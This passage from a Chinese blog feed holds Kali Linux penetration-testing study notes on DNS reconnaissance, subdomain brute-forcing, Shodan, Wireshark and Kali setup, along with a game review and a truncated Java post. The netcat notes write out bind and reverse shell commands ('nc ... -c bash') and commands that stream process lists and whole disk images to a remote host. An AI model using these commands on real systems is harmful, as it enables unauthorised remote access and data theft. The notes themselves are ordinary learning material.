        <content type="html"><![CDATA[<h1 id="信息收集内容"><a href="#信息收集内容" class="headerlink" title="信息收集内容"></a>信息收集内容</h1><ul><li>IP地址段</li><li>域名信息</li><li>邮件地址</li><li>文档图片数据</li><li>公司地址</li><li>公司组织架构</li><li>联系电话/传真号码</li><li>人员姓名/职务</li><li>目标系统使用的技术架构</li><li>公开的商业信息</li></ul><a id="more"></a><h1 id="信息用途"><a href="#信息用途" class="headerlink" title="信息用途"></a>信息用途</h1><ul><li>用信息描述目标</li><li>发现</li><li>社会工程学攻击</li><li>物理缺口</li></ul><h1 id="信息收集——DNS"><a href="#信息收集——DNS" class="headerlink" title="信息收集——DNS"></a>信息收集——DNS</h1><ul><li><p>域名解析成IP地址</p><ul><li>域名与FQDN的区别</li><li>域名记录：A、C name、NS、MX、ptr</li></ul></li><li><p>nslookup</p><ul><li>set q=a、ns、mx、any</li><li>server</li><li>nslookup -q=any 163.com </li></ul></li></ul><p>/etc/resolv.conf</p><ul><li>dig<ul><li>dig +noall +answer mail.163.com|awk ‘{print $5}’</li><li>反向查询<code>dig -x xx.x.x.xx</code> </li><li>bind版本信息<code>dig +noall +answer txt chaos VERSION.BIND @ns3.dnsv4.com</code></li><li>DNS追踪：<code>dig +trace example.com</code>直接向根域名服务器发起查询</li></ul></li><li>dig +trace查询过程抓包<ul><li>向本地DNS服务器查询root的NS记录，得到13个DNS根服务器名称 X.root-server.net </li><li>向本地DNS服务器查询 X.root-server.net对应的A记录</li><li>随机选择一个 X.root-server.net 查询sina.com的A记录，得到13个COM顶级域名服务器名称</li><li>向本地DNS服务器查询X.gtld-server.net对应的A记录</li><li>随机选择一个X.gtld-server.net 查询sina.com的A记录，得到7个sina.com的权威域名服务器名称</li><li>向本地DNS服务器查询七个权威域名服务器的A记录</li><li>向权威域名服务器查询sina.com的A记录，得到sina.com对应的IP</li></ul></li></ul><h1 id="DNS区域传输"><a href="#DNS区域传输" class="headerlink" title="DNS区域传输"></a>DNS区域传输</h1><ul><li>type: AXFR</li><li>dig @ns1.example.com example.com axfr</li><li>host -T -l sina.com</li></ul><h1 id="DNS字典爆破"><a href="#DNS字典爆破" class="headerlink" title="DNS字典爆破"></a>DNS字典爆破</h1><ul><li>fierce -dnsserver 8.8.8.8  -dns sina.com.cn -wordlist a.txt</li><li>dnsdict6 -d4 -t 16 -x sina.com</li><li>dnsenum -f dnsbig.txt -dnsserver 8.8.8.8 sina.com -o sina.xml</li><li>dnsmap sina.com -w dns.txt</li><li>dnsrecon -d sina.com –lifetime 10 -t brt -D dnsbig.txt</li><li>dnsrecon -t std -d sina.com</li><li>将多个字典集成1个大字典，熟练使用一两个dns爆破命令。</li></ul><h1 id="DNS注册信息"><a href="#DNS注册信息" class="headerlink" title="DNS注册信息"></a>DNS注册信息</h1><ul><li>Whois</li><li>whois -h whois.apnic.net 192.0.43.10</li></ul><h1 id="信息搜集——搜索引擎"><a href="#信息搜集——搜索引擎" class="headerlink" title="信息搜集——搜索引擎"></a>信息搜集——搜索引擎</h1><ul><li><p>公司新闻动态</p></li><li><p>重要雇员信息</p></li><li><p>机密文档/网络拓扑</p></li><li><p>用户名密码</p></li><li><p>目标系统软硬件技术架构</p></li><li><p>Google Hacking、Baidu Hacking、Bing Hacking</p></li></ul><h1 id="SHODAN"><a href="#SHODAN" class="headerlink" title="SHODAN"></a>SHODAN</h1><ul><li><p>搜索互联网的设备</p></li><li><p>Banner:http、ftp、ssh、telnet</p></li><li><p><a href="https://www.shodan.io" target="_blank" rel="noopener">https://www.shodan.io</a></p></li><li><p>常见filter</p></li><li><p>net(192.168.20.1)</p></li><li><p>city</p></li><li><p>country(CN、US)</p></li><li><p>port(80、21、22、23)</p></li><li><p>os</p></li><li><p>Hostname(主机域名)</p></li><li><p>server</p></li></ul>]]></content>
      
      
      <categories>
          
          <category> 信息安全 </category>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> KaliLinux渗透测试学习笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>WireShark&amp;TCPdump</title>
      <link href="/2020/08/28/WireShark&amp;TCPdump/"/>
      <url>/2020/08/28/WireShark&amp;TCPdump/</url>
      
        <content type="html"><![CDATA[<h1 id="Wireshark"><a href="#Wireshark" class="headerlink" title="Wireshark"></a>Wireshark</h1><ul><li><p>抓包嗅探协议分析</p></li><li><p>安全专家必备技能</p></li><li><p>抓包引擎</p><ul><li>Libpcap9——Linux</li><li>Winpcap10——Windows</li></ul></li><li><p>解码能力</p><a id="more"></a></li></ul><h2 id="数据包的分层结构"><a href="#数据包的分层结构" class="headerlink" title="数据包的分层结构"></a>数据包的分层结构</h2><ul><li>常见协议包<ul><li>ARP</li><li>ICMP</li><li>TCP</li><li>UDP</li><li>DNS</li><li>HTTP</li><li>FTP</li></ul></li><li>wireshark官网有各种协议的包供下载</li></ul><h2 id="信息统计功能-statistics"><a href="#信息统计功能-statistics" class="headerlink" title="信息统计功能 statistics"></a>信息统计功能 statistics</h2><ul><li>节点数 EndPoints</li><li>协议分布  Protocol Hierarchy</li><li>包大小 Packet Lengths</li><li>会话    Conversations</li><li>解码方式 Decode As…</li><li>专家系统 Expert information</li></ul><h2 id="企业抓包部署方案"><a href="#企业抓包部署方案" class="headerlink" title="企业抓包部署方案"></a>企业抓包部署方案</h2><ul><li>Sniffer</li><li>全流量分析</li></ul><h1 id="TCPDUMP——抓包"><a href="#TCPDUMP——抓包" class="headerlink" title="TCPDUMP——抓包"></a>TCPDUMP——抓包</h1><h1 id="TCPDMUP——筛选"><a href="#TCPDMUP——筛选" class="headerlink" title="TCPDMUP——筛选"></a>TCPDMUP——筛选</h1><h1 id="过程文档记录工具"><a href="#过程文档记录工具" class="headerlink" title="过程文档记录工具"></a>过程文档记录工具</h1><ul><li>dradis</li><li>keepnote</li><li>truecrypt</li></ul>]]></content>
      
      
      <categories>
          
          <category> 信息安全 </category>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> KaliLinux渗透测试学习笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>网络工具中的瑞士军刀-NETCAT</title>
      <link href="/2020/08/27/%E7%BD%91%E7%BB%9C%E5%B7%A5%E5%85%B7%E4%B8%AD%E7%9A%84%E7%91%9E%E5%A3%AB%E5%86%9B%E5%88%80-NETCAT/"/>
      <url>/2020/08/27/%E7%BD%91%E7%BB%9C%E5%B7%A5%E5%85%B7%E4%B8%AD%E7%9A%84%E7%91%9E%E5%A3%AB%E5%86%9B%E5%88%80-NETCAT/</url>
      
        <content type="html"><![CDATA[<h1 id="NC——TELNET-BANNER"><a href="#NC——TELNET-BANNER" class="headerlink" title="NC——TELNET / BANNER"></a>NC——TELNET / BANNER</h1><ul><li>nc -nv 1.1.1.1 110</li></ul><a id="more"></a><h1 id="NC——传输文本信息"><a href="#NC——传输文本信息" class="headerlink" title="NC——传输文本信息"></a>NC——传输文本信息</h1><ul><li>nc -l -p 4444</li><li>nc -nv 1.1.1.1 4444<br>审计时，输出到其它计算机<figure class="hljs highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plain">nc -l -p 333 &gt; ps.txt<br>ps -aux|nc -nv 10.1.1.12 333 -q 1<br></code></pre></td></tr></table></figure></li></ul><h1 id="NC——传输文件-目录"><a href="#NC——传输文件-目录" class="headerlink" title="NC——传输文件/目录"></a>NC——传输文件/目录</h1><ul><li>传输文件<ul><li>A:<code>nc -lp 333 &gt; 1.mp4</code></li><li>B:<code>nc -nv 1.1.1.1 333 &lt; 1.mp4 -q 1</code></li><li>或</li><li>A:<code>nc -lp 333 &lt; 1.mp4 -q 1</code></li><li>B:<code>nc -vn 333 &gt; 1.mp4</code></li></ul></li><li>传输目录<ul><li>A:<code>tar -cvf -music/ | nc -lp 333 -q 1</code></li><li>B:<code>nc -nv 1.1.1.1 333 | tar -xvf -</code></li></ul></li><li>传输加密文件<ul><li>A:<code>nc -lp 333 | mcrypt --flush -Fbqd -a rijndael-256 -m ecb &gt; 1.mp4</code></li><li>B:<code>mcrypt -flush -Fbqd -a rijndael-256 -m ecb &lt; a.mp4 | nc -nv 1.1.1.1 333 -q 1</code></li></ul></li></ul><h1 id="NC——流媒体服务"><a href="#NC——流媒体服务" class="headerlink" title="NC——流媒体服务"></a>NC——流媒体服务</h1><ul><li>A:<code>cat 1.mp4 | nc -lp 333</code></li><li>B:<code>nc -nv 1.1.1.1 333 |mplayer -vo x11 -cache 3000 -</code></li></ul><h1 id="NC——端口扫描"><a href="#NC——端口扫描" class="headerlink" title="NC——端口扫描"></a>NC——端口扫描</h1><ul><li><code>nc -nvz 1.1.1.1 -65535</code> TCP端口</li><li><code>nc -nvzu 1.1.1.1 1-1024</code> UDP端口</li></ul><h1 id="NC——远程硬盘克隆"><a href="#NC——远程硬盘克隆" class="headerlink" title="NC——远程硬盘克隆"></a>NC——远程硬盘克隆</h1><ul><li><code>nc -lp 333|dd of=/dev/sda</code></li><li><code>dd if=/dev/sda | nc -nv 1.1.1.1 333 -q 1</code></li></ul><h1 id="NC——远程控制"><a href="#NC——远程控制" class="headerlink" title="NC——远程控制"></a>NC——远程控制</h1><ul><li>正向：<ul><li>A:<code>nc -lp 333 -c bash</code></li><li>B:<code>nc -nv 1.1.1.1 333</code></li></ul></li><li>反向：<ul><li>A:<code>nc -lp 333</code></li><li>B:<code>nc -nv 1.1.1.1 333 -c bash</code></li></ul></li><li>注：Windows把bash改成cmd</li></ul><h1 id="NC——NCAT"><a href="#NC——NCAT" class="headerlink" title="NC——NCAT"></a>NC——NCAT</h1><ul><li>NC缺乏加密和身份验证的能力</li><li>Ncat</li><li>A:<code>ncat ncat -c bash --allow 192.168.20.14 -vnl 333 --ssl</code></li><li>B:<code>ncat -nv 1.1.1.1 333 --ssl</code></li><li>不同平台/系统 nc参数功能不尽相同</li></ul>]]></content>
      
      
      <categories>
          
          <category> 信息安全 </category>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> KaliLinux渗透测试学习笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>渗透测试实验环境搭建</title>
      <link href="/2020/08/26/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AE%9E%E9%AA%8C%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/"/>
      <url>/2020/08/26/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AE%9E%E9%AA%8C%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/</url>
      
        <content type="html"><![CDATA[<ul><li>Windows</li><li>Redhat、Ubuntu<ul><li>安装LAMP</li></ul></li><li>Metasploitable</li><li>m0n0wall<a id="more"></a>下面这个地址的虚拟机环境本是用于测试其中的应用<br><a href="https://www.turnkeylinux.org/" target="_blank" rel="noopener">https://www.turnkeylinux.org/</a><br>win10地址<br><a href="https://developer.microsoft.com/en-us/microsoft-edge/tools/vms/" target="_blank" rel="noopener">https://developer.microsoft.com/en-us/microsoft-edge/tools/vms/</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 信息安全 </category>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> KaliLinux渗透测试学习笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Kali定制</title>
      <link href="/2020/08/21/Kali%E5%AE%9A%E5%88%B6/"/>
      <url>/2020/08/21/Kali%E5%AE%9A%E5%88%B6/</url>
      
        <content type="html"><![CDATA[<p>新安装Kali后需要做的一些操作</p><a id="more"></a><h1 id="网络配置"><a href="#网络配置" class="headerlink" title="网络配置"></a>网络配置</h1><figure class="hljs highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs plain">dhclient etho &#x2F;&#x2F;动态分配路由<br>ifconfig eth0 192.168.1.10&#x2F;24 &#x2F;&#x2F;指定路由<br>route add default gw 192.168.1.1 &#x2F;&#x2F;指定网关<br>route add -net 172.16.1.0&#x2F;24 gw 192.168.1.100 eth0&#x2F;&#x2F;指定网段的网关和出口网卡<br>netstat -nr &#x2F;&#x2F;查看<br>vi &#x2F;etc&#x2F;resolv.conf &#x2F;&#x2F;修改DNS<br></code></pre></td></tr></table></figure><p>以上修改重启后会失效，如果想要长期有效，需要编辑网卡配置文件/etc/network/interfaces</p><h1 id="更新升级"><a href="#更新升级" class="headerlink" title="更新升级"></a>更新升级</h1><p>先修改为国内源地址</p><figure class="hljs highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plain">apt-get update<br>apt-get upgrade<br></code></pre></td></tr></table></figure><h1 id="安装适合自己的工具软件"><a href="#安装适合自己的工具软件" class="headerlink" title="安装适合自己的工具软件"></a>安装适合自己的工具软件</h1><figure class="hljs highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">- apt-get install smplayer ibus ibus-pinyin flashplugin-nonfree gdebi amule amule qbittorrent geany stardict meld meld ttf-wqy-microhei kchmviewer freemind netspeed mtr filezilla filezilla-common chromium monodevelop mono-gmcs -y<br></code></pre></td></tr></table></figure><h1 id="firefox浏览器插件"><a href="#firefox浏览器插件" class="headerlink" title="firefox浏览器插件"></a>firefox浏览器插件</h1><ul><li>flashgot、autoproxy、TamperData、cookie、importer、CookiesManager、User Agent、Switcher、HackBar、Live http header、FireBug、Download YouTube Videos as MP4、Flagfox、hashr、XSS Me、SQL Inject Me</li></ul><h1 id="显卡驱动-密码破解"><a href="#显卡驱动-密码破解" class="headerlink" title="显卡驱动(密码破解)"></a>显卡驱动(密码破解)</h1><figure class="hljs highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs plain">apt-get dist-upgrade<br>apt-get install -y linux-headers-$&#123;uname -r&#125;<br>apt-get install nvidia-kernel-dkms<br><br>sed &#39;s&#x2F;quiet&#x2F;quiet nouveau.modeset&#x3D;0&#x2F;g&#39; -i &#x2F;etc&#x2F;default&#x2F;grub<br>update-grub<br>reboot<br></code></pre></td></tr></table></figure><ul><li>验证：<ul><li>glxinfo|grep -i “direct rendering”<ul><li>direct rendering:Yes</li></ul></li></ul></li></ul><h1 id="并发线程限制"><a href="#并发线程限制" class="headerlink" title="并发线程限制"></a>并发线程限制</h1><ul><li>ulimit用于限制当前shell内进程的资源使用</li><li>查看默认值<ul><li>ulimit -a</li></ul></li><li>全局配置文件：/etc/security/limits</li><li>用途<ul><li>限制堆栈大小：ulimit -s 100</li><li>限制shell内存使用：ulimit -m 5000 -v 5000</li></ul></li><li>没有直接对socket数量的限制参数<ul><li>Linux系统中一切都是文件，运行中的文件叫做进程</li><li>ulimite -n 800000</li></ul></li></ul><h1 id="笔记本模式"><a href="#笔记本模式" class="headerlink" title="笔记本模式"></a>笔记本模式</h1><ul><li>自行搜索</li></ul><h1 id="服务开关"><a href="#服务开关" class="headerlink" title="服务开关"></a>服务开关</h1><ul><li>Kali默认未启动所有网络服务</li></ul><p>/etc/init.d/下有各种服务的启动脚本<br>例：启动ssh</p><figure class="hljs highlight plain"><figcaption><span>start```</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs ./ssh">如果想下次重启后还启动ssh<br>&#96;&#96;&#96;update-rc.d ssh default<br></code></pre></td></tr></table></figure><p>default 会在 2 3 4 5运行级别启动，0 1 6关闭</p><figure class="hljs highlight plain"><figcaption><span>A defaults 80 20```</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs update-rc.d">A服务启动的优先级是80 关闭的优先级是20，优先级数字小的先执行。<br><br># GFW长城防火墙<br><br>-翻墙<br>  - http代理（明文传输）<br>  - socks代理<br>  - ssh隧道<br>  - <br><br>- Goagent<br>- Tor<br>  - tor project<br>  - wiki地址：<br>    - zqktlwi4fecvo6ri.onion&#x2F;<br>    - zqktlwiuavvvqqt4ybvgvi7tyo4hjl5xgfuvpdf6otjiycgwqbym2qad.onion&#x2F;<br><br>- 代理的意义所在<br>  - 加密信息<br>  - 隐藏来源<br>  - 突破网络封锁<br><br>- 注意事项<br>  - 不要触及敏感地带<br>  - 不要从事非法行为<br><br>  例：<br>  给apt-get设置代理<br>  &#x2F;etc&#x2F;apt&#x2F;apt.conf<br></code></pre></td></tr></table></figure><p>  Acquire::ftp::Proxy “<a href="ftp://127.0.0.1:8087/&quot;">ftp://127.0.0.1:8087/&quot;</a><br>  Acquire::http::Proxy “<a href="http://127.0.0.1:8087/&quot;" target="_blank" rel="noopener">http://127.0.0.1:8087/&quot;</a><br>  Acquire::https::Proxy “<a href="https://127.0.0.1:8087/&quot;" target="_blank" rel="noopener">https://127.0.0.1:8087/&quot;</a><br>  Acquire::socks::Proxy “<a href="https://127.0.0.1:8087/&quot;" target="_blank" rel="noopener">https://127.0.0.1:8087/&quot;</a><br>  <figure class="hljs highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plain"><br>&#x2F;etc&#x2F;bash.bashrc<br></code></pre></td></tr></table></figure><br>  export ftp_proxy=”<a href="ftp://user:password@proxyIP:port&quot;">ftp://user:password@proxyIP:port&quot;</a><br>         http_proxy<br>         https_proxy<br>         socks_proxy</p><p>  ```</p><h3 id="代理链"><a href="#代理链" class="headerlink" title="代理链"></a>代理链</h3><p>/etc/proxychains.conf</p>]]></content>
      
      
      <categories>
          
          <category> 信息安全 </category>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> KaliLinux渗透测试学习笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>渗透测试及Kali初探</title>
      <link href="/2020/08/19/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%88%9D%E6%8E%A2/"/>
      <url>/2020/08/19/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%88%9D%E6%8E%A2/</url>
      
        <content type="html"><![CDATA[<h1 id="渗透测试标准PETS"><a href="#渗透测试标准PETS" class="headerlink" title="渗透测试标准PETS"></a>渗透测试标准<a href="http://www.pentest-standard.org" target="_blank" rel="noopener">PETS</a></h1><ul><li>前期交互阶段（与客户沟通，确定测试范围，测试方式，时间等。）</li><li>情报收集阶段</li><li>威胁建模阶段（分析，确定最可行的攻击通道。）</li><li>漏洞分析阶段</li><li>渗透攻击阶段</li><li>后渗透测试阶段（尽可能展现威胁影响程度）</li><li>渗透测试报告<a id="more"></a></li></ul><hr><h1 id="Kali"><a href="#Kali" class="headerlink" title="Kali"></a>Kali</h1><ul><li>Kali命名参考印度神话</li><li>基于Debian,前身是2013年3月发布的BackTrack</li><li>用于渗透测试和安全审计</li><li>包含600+安全工具</li><li>FHS标准目录结构</li><li><ul><li>BackTrack将所有相关工具放在/pentest目录下，下分更细目录如web,database，有些工具很难界定放在哪个目录。</li></ul></li><li>定制内核（关于无线驱动）</li><li>支持ARM和手机平台（Nethunter）</li><li>开源免费（Offensi Security）</li></ul><h1 id="Kali-Linux策略"><a href="#Kali-Linux策略" class="headerlink" title="Kali Linux策略"></a>Kali Linux策略</h1><ul><li>Root用户策略（默认root）</li><li>网络服务策略（默认全部关闭，新装软件默认启动脚本不启动，需要用update.rc.d命令）</li><li>更新升级策略（随Debian,Offensive Security维护工具。）</li></ul><h1 id="Kali-VirtualBox-环境搭建"><a href="#Kali-VirtualBox-环境搭建" class="headerlink" title="Kali VirtualBox 环境搭建"></a>Kali VirtualBox 环境搭建</h1><ol><li>首先下载kali官方的VirtualBox镜像。</li><li>默认用户名密码是kali/kali,切换root用<code>sudo su</code></li><li><code>apt-get update</code></li><li><code>apt-get install linux-headers-$(uname -r)</code></li><li>安装VirtualBox增强，点击Devices–&gt;Insert GuestAdditons CD image,在桌面会出现一个光盘图标的文件。<br>运行其中对应的.run文件。</li></ol><h1 id="Kali-持久加密USB安装"><a href="#Kali-持久加密USB安装" class="headerlink" title="Kali 持久加密USB安装"></a>Kali 持久加密USB安装</h1><ol><li>VirtualBox共享Windows文件夹，将kali镜像放入其中</li><li>插入U盘</li><li>使用dmesg命令查看U盘名称（例：”sdb”）</li><li>使用GParted将sdb分区删除</li><li>使用dd命令将镜像按块写入U盘(使用watch命令查看进度，每5秒发送一次SIGUSR1信号)</li><li>使用parted从上一分区结束位置创建分区</li><li>使用LUKS加密分区<code>cryptsetup --verbose --verify-passphrase luksFormat /dev/sdb</code></li><li>打开加密分区<code>cryptsetup luksOpen /dev/sdb3 usb</code></li><li>mkfs.ext4 /dev/mapper/usb将分区格式化成ext4</li><li>e2label /dev/mapper/usb persistence将分区卷标指定为persistence（必须是persistence——持久化的意思</li><li>完成后，在mnt目录下创建一个文件夹，将分区挂载到该文件夹处，并填入配置文件。完成后卸掉挂载，并关闭加密区。</li></ol><figure class="hljs highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs plain">mkdir -p &#x2F;mnt&#x2F;kali<br>mount &#x2F;dev&#x2F;mapper&#x2F;kali &#x2F;mnt&#x2F;kali<br>echo &quot;&#x2F; union&quot; &gt; &#x2F;mnt&#x2F;kali&#x2F;persistence.conf<br>umount &#x2F;dev&#x2F;mapper&#x2F;kali<br>cryptsetup luksClose &#x2F;dev&#x2F;mapper&#x2F;kali<br></code></pre></td></tr></table></figure><h1 id="常用工具"><a href="#常用工具" class="headerlink" title="常用工具"></a>常用工具</h1><ul><li>nmap            网络发现</li><li>burpsuit         http请求中间人</li><li>zap            http请求中间人</li><li>sqlmap        SQL注入</li><li>aircrack-ng    无线破解</li><li>metasploit    渗透测试框架</li><li>maltego        信息收集</li><li>john            密码破解</li><li>hydra            密码破解</li><li>wireshark        抓包</li></ul><p>实时流量显示 NetSpeed</p><p>#学习</p><ul><li>实践是最好的老师，加油。</li></ul>]]></content>
      
      
      <categories>
          
          <category> 信息安全 </category>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> KaliLinux渗透测试学习笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>点击上方的关于查看我的更多信息</title>
      <link href="/2020/08/18/%E7%82%B9%E5%87%BB%E4%B8%8A%E6%96%B9%E7%9A%84%E5%85%B3%E4%BA%8E%E6%9F%A5%E7%9C%8B%E6%88%91%E7%9A%84%E6%9B%B4%E5%A4%9A%E4%BF%A1%E6%81%AF/"/>
      <url>/2020/08/18/%E7%82%B9%E5%87%BB%E4%B8%8A%E6%96%B9%E7%9A%84%E5%85%B3%E4%BA%8E%E6%9F%A5%E7%9C%8B%E6%88%91%E7%9A%84%E6%9B%B4%E5%A4%9A%E4%BF%A1%E6%81%AF/</url>
      
        <content type="html"><![CDATA[<p>有些时间没有写博客了(惭愧)，点<a href="https://pyrrhax.com/about/" target="_blank" rel="noopener">这里</a> 了解我吧</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>We are different,but we go together ----《深海迷航》</title>
      <link href="/2019/01/24/We%20are%20different,but%20we%20go%20together%20----%E3%80%8A%E6%B7%B1%E6%B5%B7%E8%BF%B7%E8%88%AA%E3%80%8B/"/>
      <url>/2019/01/24/We%20are%20different,but%20we%20go%20together%20----%E3%80%8A%E6%B7%B1%E6%B5%B7%E8%BF%B7%E8%88%AA%E3%80%8B/</url>
      
        <content type="html"><![CDATA[<p><img src="/2019/01/24/We%20are%20different,but%20we%20go%20together%20----%E3%80%8A%E6%B7%B1%E6%B5%B7%E8%BF%B7%E8%88%AA%E3%80%8B/leviathan.png" alt><br><strong>What is a wave without the ocean,a begining without the end.</strong><br><strong>They are different,but they go together.</strong><br><strong>Now you go among the stars,and I fall among the sands.</strong><br><strong>We are different,but we go together.</strong></p><a id="more"></a><p>第一次感到对大海的恐惧，是在洛圣都开着快艇来到地图边界。天空布满灰色的乌云，环顾四周也看不到一片陆地，尽是波涛汹涌的海水。快艇随着大海蓝黑泛白的涟漪上下起伏。船慢慢沉入水中。只好游泳，水中永远是深蓝不见底，越往深处光线越暗。没有多久就被鲨鱼攻击，然后死掉了。压抑，恐惧，无助。我不知道是幽闭恐惧还是深海恐惧，这种感觉在之后的一段时间，一直让我记忆犹新。<br>后来偶然听闻有某游戏专治“深海恐惧”，我不由得又想到了这种体验。忍不住下载然后尝试。（当时是2016年，游戏还在开发阶段，虽然相比于现在有一些不足，但也都无关紧要。）<br>故事的开始主角已经进入了星际飞船“极光号”的救生舱，随着极光号的坠落，十几个逃生舱也散落在4546B这个绝大部分都是海洋的星球上。为了等待救援，不得不开始探索周边环境。看得出来这是科技非常发达的时代，主角借助PDA，配合光谱扫描仪，一点一点了解周边生态环境。也就是在这个过程中，发现了这个星球上更多的秘密。<br>身上有绿色斑点的各种生物，外星进水排水设施，嘉德斯号船员的遗址，极光号受到的未能分析出结果的损伤形式。逐渐让主角对这个星球的故事产生好奇。<br>不得不让人称赞的是这个游戏的音乐和音效。让人印象深刻的是暗礁鱼低沉悠长的叫声，让人听到就觉得孤独。深潜时捕食者的咆哮也给游戏增添了一丝紧张感。在浅水区，绿藻区，树蘑菇林，失落之河……每个区域都有独特的风景。精心设计的地图，相比于随机生成更加有美感。场景切换时的音乐，也和环境氛围完美融合。代入感极佳。<br>开始玩了大概有20多个小时，因为感到深深的孤独，就没有勇气继续玩下去了。（在后来的版本，开发商为了减轻玩家的这种痛苦，增加了一个可爱的抱抱鱼作为宠物qwq）<br>直到两年后，我又重新拾起了这个游戏。在这之间，它已经由完美世界发行，并收入WeGame平台之中，在游戏发售后IGN 也给出了9.1 Amazing的高分,也被游民星空评价为开放世界生存游戏的典范。<br>在游戏中最让我感兴趣的部分是扫描各种未知的生物。它们以各种奇妙的方式来运动，进食，共生，等等，完成自己的生命周期。<br>包括显示出重度基因修正和多处机械移植迹象的生命形式——裂空者，有机体和高科技的完美结合造就了这种强力且危险的生物。<br>随着剧情的一步步推进，主角在这个星球上收到海皇心电感应发来的讯息，让这个孤独的世界不那么孤独。玩到这里的时候，已经满脑子都是“我要见到海皇”这种想法了。<br>当主角终于找到离开的方法时，这个巨大却温柔生物却不得不走向生命的终结。<br><strong>We are different,but we go together.</strong><br>事情总是这样，不过，可以相遇就已经足够了，不是吗。<br>面对巨大生物时的震撼，各种奇妙的生命形式，面对未知的恐惧和强烈的好奇，和伴随着整个游戏进程的深深孤独感，都是令人着迷的神奇体验。</p>]]></content>
      
      
      <categories>
          
          <category> 游戏 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 科幻 </tag>
            
            <tag> 生存 </tag>
            
            <tag> 沙盒 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>关于Java多线程两种实现方式的一点想法</title>
      <link href="/2018/09/23/%E5%85%B3%E4%BA%8EJava%E5%A4%9A%E7%BA%BF%E7%A8%8B%E4%B8%A4%E7%A7%8D%E5%AE%9E%E7%8E%B0%E6%96%B9%E5%BC%8F%E7%9A%84%E4%B8%80%E7%82%B9%E6%83%B3%E6%B3%95/"/>
      <url>/2018/09/23/%E5%85%B3%E4%BA%8EJava%E5%A4%9A%E7%BA%BF%E7%A8%8B%E4%B8%A4%E7%A7%8D%E5%AE%9E%E7%8E%B0%E6%96%B9%E5%BC%8F%E7%9A%84%E4%B8%80%E7%82%B9%E6%83%B3%E6%B3%95/</url>
      
        <content type="html"><![CDATA[<p>在看某本书的时候里面讲到继承Thread类和实现Runnable接口的区别。有这么一条是说“继承Thread类不能资源共享，而实现Runnable接口可以。”于是产生了以下问题。</p><a id="more"></a><p>书上的代码如下。</p><figure class="hljs highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs plain">&#x2F;**<br>*实现Runnable接口可以资源共享<br>*&#x2F;<br>public class ShareResourceTest2 implements Runnable&#123;<br>    private int ticket &#x3D;20;<br>    public void run()&#123;<br>        for(int 